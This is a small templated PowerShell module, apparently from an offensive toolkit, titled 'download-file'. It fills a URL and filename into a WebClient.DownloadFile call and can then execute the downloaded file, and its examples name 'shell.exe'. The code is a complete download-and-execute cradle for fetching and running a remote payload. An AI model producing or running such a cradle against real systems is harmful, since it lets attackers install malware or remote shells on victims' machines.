##########
Name: download-file
Author: Jusmistic
Description: Download file from url
Options:
    url: "File's URL (Ex: http://127.0.0.1/shell.exe)"
    execute: "Execute downloaded file? (Ex. y = yes / n = no)"
    filename: "Filename to execute (Ex:shell.exe)"
##########

(New-Object System.Net.WebClient).DownloadFile('{{url}}', '{{filename}}');
{% if execute == 'y' %}start .\{{filename}}; {% endif %}
